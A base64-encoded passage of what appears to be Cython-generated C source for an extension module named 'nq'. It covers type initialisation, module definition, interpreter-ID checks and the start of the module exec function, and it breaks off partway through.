Jl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3ID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3X3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3X3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgPSAmX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3c7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndy0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndy0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3ctPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7XG4gIH1cbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7XG4gIH1cbiAgI2VuZGlmXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIC0xO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpOyBcbnN0YXRpYyBpbnQgX19weXhfcHltb2RfZXhlY19ucShQeU9iamVjdCogbW9kdWxlKTsgXG5zdGF0aWMgUHlNb2R1bGVEZWZfU2xvdCBfX3B5eF9tb2R1bGVkZWZfc2xvdHNbXSA9IHtcbiAge1B5X21vZF9jcmVhdGUsICh2b2lkKilfX3B5eF9weW1vZF9jcmVhdGV9LFxuICB7UHlfbW9kX2V4ZWMsICh2b2lkKilfX3B5eF9weW1vZF9leGVjX25xfSxcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gIHtQeV9tb2RfZ2lsLCBQeV9NT0RfR0lMX1VTRUR9LFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAge1B5X21vZF9tdWx0aXBsZV9pbnRlcnByZXRlcnMsIFB5X01PRF9NVUxUSVBMRV9JTlRFUlBSRVRFUlNfTk9UX1NVUFBPUlRFRH0sXG4gICNlbmRpZlxuICB7MCwgTlVMTH1cbn07XG4jZW5kaWZcblxuI2lmZGVmIF9fY3BsdXNwbHVzXG5uYW1lc3BhY2Uge1xuICBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID1cbiAgI2Vsc2VcbiAgc3RhdGljIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWYgPVxuICAjZW5kaWZcbiAge1xuICAgICAgUHlNb2R1bGVEZWZfSEVBRF9JTklULFxuICAgICAgIm5xIixcbiAgICAgIDAsIFxuICAgICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICAgc2l6ZW9mKF9fcHl4X21zdGF0ZXR5cGUpLCBcbiAgICAjZWxzZVxuICAgICAgKENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCkgPyAwIDogLTEsIFxuICAgICNlbmRpZlxuICAgICAgX19weXhfbWV0aG9kcyAsXG4gICAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAgICAgX19weXhfbW9kdWxlZGVmX3Nsb3RzLCBcbiAgICAjZWxzZVxuICAgICAgTlVMTCwgXG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgICBfX3B5eF9tX3RyYXZlcnNlLCBcbiAgICAgIF9fcHl4X21fY2xlYXIsIFxuICAgICAgTlVMTCBcbiAgICAjZWxzZVxuICAgICAgTlVMTCwgXG4gICAgICBOVUxMLCBcbiAgICAgIE5VTEwgXG4gICAgI2VuZGlmXG4gIH07XG4gICNpZmRlZiBfX2NwbHVzcGx1c1xufSBcbiNlbmRpZlxuXG5cbiNpZm5kZWYgQ1lUSE9OX05PX1BZSU5JVF9FWFBPUlRcbiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBQeU1PRElOSVRfRlVOQ1xuI2Vsc2VcbiAgI2lmZGVmIF9fY3BsdXNwbHVzXG4gICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgZXh0ZXJuICJDIiBQeU9iamVjdCAqXG4gICNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlPYmplY3QgKlxuICAjZW5kaWZcbiNlbmRpZlxuXG5fX1B5eF9QeU1PRElOSVRfRlVOQyBQeUluaXRfbnEodm9pZCkgQ1lUSE9OX1NNQUxMX0NPREU7IFxuX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X25xKHZvaWQpXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG57XG4gIHJldHVybiBQeU1vZHVsZURlZl9Jbml0KCZfX3B5eF9tb2R1bGVkZWYpO1xufVxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuc3RhdGljIFBZX0lOVDY0X1QgX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQodm9pZCkge1xuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX2ludGVycHJldGVycyIpOyAvLyAzLjEzKyBJIHRoaW5rXG4gICAgICAgIGlmICghbW9kdWxlKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpOyAvLyBqdXN0IHRyeSB0aGUgMy44LTMuMTIgdmVyc2lvblxuICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJfeHhzdWJpbnRlcnByZXRlcnMiKTtcbiAgICAgICAgICAgIGlmICghbW9kdWxlKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBQeU9iamVjdCAqY3VycmVudCA9IFB5T2JqZWN0X0NhbGxNZXRob2QobW9kdWxlLCAiZ2V0X2N1cnJlbnQiLCBOVUxMKTtcbiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgICAgIGlmICghY3VycmVudCkgZ290byBiYWQ7XG4gICAgICAgIGlmIChQeVR1cGxlX0NoZWNrKGN1cnJlbnQpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbmV3X2N1cnJlbnQgPSBQeVNlcXVlbmNlX0dldEl0ZW0oY3VycmVudCwgMCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoY3VycmVudCk7XG4gICAgICAgICAgICBjdXJyZW50ID0gbmV3X2N1cnJlbnQ7XG4gICAgICAgICAgICBpZiAoIW5ld19jdXJyZW50KSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBsb25nIGxvbmcgYXNfY19pbnQgPSBQeUxvbmdfQXNMb25nTG9uZyhjdXJyZW50KTtcbiAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpO1xuICAgICAgICByZXR1cm4gYXNfY19pbnQ7XG4gICAgfVxuICBiYWQ6XG4gICAgUHlTeXNfV3JpdGVTdGRlcnIoIl9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkIGZhaWxlZC4gVHJ5IHNldHRpbmcgdGhlIEMgZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVD0wXFxuIik7XG4gICAgcmV0dXJuIC0xO1xufVxuI2VuZGlmXG4jaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcih2b2lkKSB7XG4gICAgc3RhdGljIFBZX0lOVDY0X1QgbWFpbl9pbnRlcnByZXRlcl9pZCA9IC0xO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SURGcm9tVGhyZWFkU3RhdGUoUHlUaHJlYWRTdGF0ZV9HZXQoKSk7XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChQeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IF9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkKCk7XG4jZWxzZVxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChQeVRocmVhZFN0YXRlX0dldCgpLT5pbnRlcnApO1xuI2VuZGlmXG4gICAgaWYgKHVubGlrZWx5KGN1cnJlbnRfaWQgPT0gLTEpKSB7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgaWYgKG1haW5faW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHtcbiAgICAgICAgbWFpbl9pbnRlcnByZXRlcl9pZCA9IGN1cnJlbnRfaWQ7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkobWFpbl9pbnRlcnByZXRlcl9pZCAhPSBjdXJyZW50X2lkKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19JbXBvcnRFcnJvcixcbiAgICAgICAgICAgICJJbnRlcnByZXRlciBjaGFuZ2UgZGV0ZWN0ZWQgLSB0aGlzIG1vZHVsZSBjYW4gb25seSBiZSBsb2FkZWQgaW50byBvbmUgaW50ZXJwcmV0ZXIgcGVyIHByb2Nlc3MuIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShQeU9iamVjdCAqc3BlYywgUHlPYmplY3QgKm1vZGRpY3QsIGNvbnN0IGNoYXIqIGZyb21fbmFtZSwgY29uc3QgY2hhciogdG9fbmFtZSwgaW50IGFsbG93X25vbmUpXG57XG4gICAgUHlPYmplY3QgKnZhbHVlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCBmcm9tX25hbWUpO1xuICAgIGludCByZXN1bHQgPSAwO1xuICAgIGlmIChsaWtlbHkodmFsdWUpKSB7XG4gICAgICAgIGlmIChhbGxvd19ub25lIHx8IHZhbHVlICE9IFB5X05vbmUpIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZGRpY3QsIHRvX25hbWUsIHZhbHVlKTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYodmFsdWUpO1xuICAgIH0gZWxzZSBpZiAoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBQeU9iamVjdCogX19weXhfcHltb2RfY3JlYXRlKFB5T2JqZWN0ICpzcGVjLCBQeU1vZHVsZURlZiAqZGVmKSB7XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICptb2RkaWN0LCAqbW9kbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihkZWYpO1xuICAgICNpZiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgICBpZiAoX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKCkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgICNlbmRpZlxuICAgIGlmIChfX3B5eF9tKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X20pO1xuICAgIG1vZG5hbWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHNwZWMsICJuYW1lIik7XG4gICAgaWYgKHVubGlrZWx5KCFtb2RuYW1lKSkgZ290byBiYWQ7XG4gICAgbW9kdWxlID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpO1xuICAgIFB5X0RFQ1JFRihtb2RuYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gYmFkO1xuICAgIG1vZGRpY3QgPSBQeU1vZHVsZV9HZXREaWN0KG1vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2RkaWN0KSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgImxvYWRlciIsICJfX2xvYWRlcl9fIiwgMSkgPCAwKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgIm9yaWdpbiIsICJfX2ZpbGVfXyIsIDEpIDwgMCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJwYXJlbnQiLCAiX19wYWNrYWdlX18iLCAxKSA8IDApKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAic3VibW9kdWxlX3NlYXJjaF9sb2NhdGlvbnMiLCAiX19wYXRoX18iLCAwKSA8IDApKSBnb3RvIGJhZDtcbiAgICByZXR1cm4gbW9kdWxlO1xuYmFkOlxuICAgIFB5X1hERUNSRUYobW9kdWxlKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X3B5bW9kX2V4ZWNfbnEoUHlPYmplY3QgKl9fcHl4X3B5aW5pdF9tb2R1bGUpXG4jZW5kaWZcbntcbiAgaW50IHN0cmluZ3RhYl9pbml0aWFsaXplZCA9IDA7XG4gICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICBpbnQgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMDtcbiAgI2VuZGlmXG4gIF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIGlmIChfX3B5eF9tKSB7XG4gICAgaWYgKF9fcHl4X20gPT0gX19weXhfcHlpbml0X21vZHVsZSkgcmV0dXJuIDA7XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgIk1vZHVsZSBcJ25xXCcgaGFzIGFscmVhZHkgYmVlbiBpbXBvcnRlZC4gUmUtaW5pdGlhbGlzYXRpb24gaXMgbm90IHN1cHBvcnRlZC4iKTtcbiAgICByZXR1cm4gLTE7XG4gIH1cbiAgI2Vsc2VcbiAgaWYgKF9fcHl4X20pIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7XG4gICNlbmRpZlxuICBcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICBfX3B5eF90XzEgPSBfX3B5eF9weWluaXRfbW9kdWxlO1xuICBQeV9JTkNSRUYoX19weXhfdF8xKTtcbiAgI2Vsc2VcbiAgX19weXhfdF8xID0gUHlNb2R1bGVfQ3JlYXRlKCZfX3B5eF9tb2R1bGVkZWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICB7XG4gICAgaW50IGFkZF9tb2R1bGVfcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlKF9fcHl4X3RfMSwgJl9fcHl4X21vZHVsZWRlZik7XG4gICAgX19weXhfdF8xID0gMDsgXG4gICAgaWYgKHVubGlrZWx5KChhZGRfbW9kdWxlX3Jlc3VsdCA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDE7XG4gIH1cbiAgI2Vsc2VcbiAgX19weXhfbSA9IF9fcHl4X3RfMTtcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICBQeVVuc3RhYmxlX01vZHVsZV9TZXRHSUwoX19weXhfbSwgUHlfTU9EX0dJTF9VU0VEKTtcbiAgI2VuZGlmXG4gIF9fcHl4X21zdGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWw7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RfMSk7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZCA9IFB5TW9kdWxlX0dldERpY3QoX19weXhfbSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9kKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBQeV9JTkNSRUYoX19weXhfbXN0YXRlLT5fX3B5eF9kKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9iID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfYikpIF9fUFlYX0VSUigwLCAxLCBf